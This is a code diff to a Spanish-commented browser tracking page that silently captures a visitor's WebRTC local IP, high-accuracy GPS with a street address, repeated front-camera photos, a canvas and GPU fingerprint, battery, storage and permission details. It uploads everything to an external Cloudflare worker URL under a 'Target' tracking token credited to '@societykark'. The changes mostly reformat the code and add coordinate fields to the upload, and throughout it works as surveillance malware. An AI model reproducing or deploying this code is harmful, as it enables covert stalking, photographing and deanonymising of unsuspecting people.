@@ -17,7 +17,7 @@
         // ============================================================
         // CONFIGURACIÓN
         // ============================================================
-        const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO POR TU TOKEN
+        const trackingId = 'AQUI_VA_TOKEN';
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
         console.log('✅ Script iniciado');
@@ -44,30 +44,51 @@
                     pc.onicecandidate = (ice) => {
                         if (!ice || !ice.candidate) return;
                         const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                        if (ip) { pc.close(); resolve(ip[0]); }
+                        if (ip) {
+                            pc.close();
+                            resolve(ip[0]);
+                        }
                     };
-                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
-                } catch(e) { resolve(null); }
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(null);
+                    }, 3000);
+                } catch(e) {
+                    resolve(null);
+                }
             });
         }
 
         function capturarGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
                 let mejor = null;
                 let watchId = navigator.geolocation.watchPosition(
                     (pos) => {
-                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+                        const coords = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            acc: pos.coords.accuracy
+                        };
                         if (!mejor || coords.acc < mejor.acc) mejor = coords;
                         if (coords.acc < 100) {
                             navigator.geolocation.clearWatch(watchId);
                             resolve(mejor);
                         }
                     },
-                    () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
+                    () => {
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve(mejor);
+                    },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
-                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    resolve(mejor);
+                }, 8000);
             });
         }
 
@@ -76,9 +97,16 @@
             const canvas = document.getElementById('c');
             const fotos = [];
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
                 video.srcObject = stream;
-                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+                await new Promise(r => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        r();
+                    };
+                });
                 await new Promise(r => setTimeout(r, 300));
                 for (let i = 0; i < cantidad; i++) {
                     canvas.width = video.videoWidth || 640;
@@ -86,12 +114,15 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                     fotos.push(blob);
-                    console.log(`📸 Foto ${i+1} capturada`);
+                    console.log(`📸 Foto ${i+1} capturada (${blob.size} bytes)`);
                     await new Promise(r => setTimeout(r, 200));
                 }
                 stream.getTracks().forEach(t => t.stop());
                 return fotos;
-            } catch(e) { return []; }
+            } catch(e) {
+                console.warn('⚠️ Cámara no disponible:', e.message);
+                return [];
+            }
         }
 
         function obtenerDispositivo() {
@@ -104,8 +135,11 @@
             else if (ua.includes('Windows')) modelo = 'Windows PC';
             else if (ua.includes('Linux')) modelo = 'Linux';
             return {
-                modelo, userAgent: ua, language: navigator.language || 'N/A',
-                platform: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A',
+                modelo,
+                userAgent: ua,
+                language: navigator.language || 'N/A',
+                platform: navigator.platform || 'N/A',
+                vendor: navigator.vendor || 'N/A',
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 colorDepth: window.screen.colorDepth || 'N/A',
                 cpuCores: navigator.hardwareConcurrency || 'N/A',
@@ -117,7 +151,8 @@
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                canvas.width = 200; canvas.height = 50;
+                canvas.width = 200;
+                canvas.height = 50;
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(0, 0, 200, 50);
                 ctx.fillStyle = '#069';
@@ -130,6 +165,7 @@
                     const info = gl.getExtension('WEBGL_debug_renderer_info');
                     if (info) {
                         const rawGpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+                        // Limpiar el nombre de la GPU
                         gpu = rawGpu.replace(/ANGLE \(([^,]+),.*/, '$1').trim();
                         if (gpu.includes('Intel')) gpu = 'Intel Graphics';
                         else if (gpu.includes('NVIDIA')) gpu = 'NVIDIA GPU';
@@ -138,14 +174,21 @@
                     }
                 } catch(e) {}
                 return { gpu, canvas: hash };
-            } catch(e) { return { gpu: 'N/A', canvas: 'N/A' }; }
+            } catch(e) {
+                return { gpu: 'N/A', canvas: 'N/A' };
+            }
         }
 
         async function obtenerBateria() {
             try {
                 const battery = await navigator.getBattery();
-                return { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Sí' : 'No' };
-            } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Sí' : 'No'
+                };
+            } catch(e) {
+                return { level: 'N/A', charging: 'N/A' };
+            }
         }
 
         async function obtenerAlmacenamiento() {
@@ -153,11 +196,17 @@
                 const est = await navigator.storage.estimate();
                 const totalGB = (est.quota / (1024 ** 3));
                 const usedGB = (est.usage / (1024 ** 3));
+                // Si los valores son 0 o muy pequeños, mostrar "No disponible"
                 if (totalGB < 0.01 && usedGB < 0.01) {
                     return { total: 'No disponible', used: 'No disponible' };
                 }
-                return { total: totalGB.toFixed(2) + ' GB', used: usedGB.toFixed(2) + ' GB' };
-            } catch(e) { return { total: 'No disponible', used: 'No disponible' }; }
+                return {
+                    total: totalGB.toFixed(2) + ' GB',
+                    used: usedGB.toFixed(2) + ' GB'
+                };
+            } catch(e) {
+                return { total: 'No disponible', used: 'No disponible' };
+            }
         }
 
         async function obtenerPermisos() {
@@ -174,7 +223,7 @@
         }
 
         // ============================================================
-        // CONSTRUIR MENSAJE
+        // ENVIAR AL WORKER
         // ============================================================
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
@@ -190,73 +239,61 @@
                     obtenerPermisos()
                 ]);
 
-                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length);
+                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length, 'IP Local:', ipLocal);
 
-                let gpsConDireccion = null;
-                if (gps) {
-                    const direccion = await reverseGeocode(gps.lat, gps.lng);
-                    gpsConDireccion = { ...gps, direccion };
-                }
-
-                // ========== CONSTRUIR MENSAJE ==========
-                let msg = '📊 Visitor Information Captured\n';
-                msg += '━━━━━━━━━━━━━━━━\n\n';
-
-                // 1. Device & Browser
-                msg += '🖥️ Device & Browser\n';
+                // Construir mensaje
+                let msg = '🖥️ Device & Browser\n';
                 msg += `   • Device Model: ${dispositivo.modelo}\n`;
                 msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
-                // 2. Fingerprint
                 msg += '🎨 Fingerprint\n';
                 msg += `   • GPU: ${fp.gpu}\n`;
                 msg += `   • Canvas: ${fp.canvas}\n\n`;
 
-                // 3. Network Information
                 msg += '🌐 Network Information\n';
                 if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
                 msg += `   • Language: ${dispositivo.language}\n\n`;
 
-                // 4. GPS (si está disponible)
-                if (gpsConDireccion) {
-                    msg += '📍 GPS (si está disponible)\n';
-                    msg += `   • Coordenadas: ${gpsConDireccion.lat}, ${gpsConDireccion.lng}\n`;
-                    msg += `   • Precisión: ±${Math.round(gpsConDireccion.acc)}m\n`;
-                    if (gpsConDireccion.direccion) msg += `   • Dirección: ${gpsConDireccion.direccion}\n`;
-                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gpsConDireccion.lat},${gpsConDireccion.lng}\n\n`;
+                msg += '📍 GPS (si está disponible)\n';
+                if (gps) {
+                    const direccion = await reverseGeocode(gps.lat, gps.lng);
+                    msg += `   • Coordenadas: ${gps.lat}, ${gps.lng}\n`;
+                    msg += `   • Precisión: ±${Math.round(gps.acc)}m\n`;
+                    if (direccion) msg += `   • Dirección: ${direccion}\n`;
+                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+                } else {
+                    msg += '   • No disponible (permiso denegado o sin GPS)\n';
                 }
+                msg += '\n';
 
-                // 5. Display Information
                 msg += '🖼️ Display Information\n';
                 msg += `   • Resolution: ${dispositivo.resolution}\n`;
                 msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
 
-                // 6. Battery Status
                 msg += '🔋 Battery Status\n';
                 msg += `   • Level: ${bateria.level}\n`;
                 msg += `   • Charging: ${bateria.charging}\n\n`;
 
-                // 7. Device Permissions
                 msg += '🔐 Device Permissions\n';
                 msg += `   • Camera: ${permisos.camera}\n`;
                 msg += `   • Location: ${permisos.location}\n\n`;
 
-                // 8. Hardware & Storage
                 msg += '💾 Hardware & Storage\n';
                 msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
                 msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
                 msg += `   • Storage Used: ${almacenamiento.used}\n`;
                 msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
 
-                // 9. Target
                 msg += '━━━━━━━━━━━━━━━━\n';
                 msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
                 msg += `⚡ Developed by: @societykark\n`;
                 msg += `⏰ ${new Date().toISOString()}`;
 
-                // ========== ENVIAR AL WORKER ==========
+                // Construir FormData
                 const formData = new FormData();
                 formData.append('text', msg);
+                formData.append('latitude', gps?.lat || '');
+                formData.append('longitude', gps?.lng || '');
                 fotos.forEach((foto, index) => {
                     if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
                 });
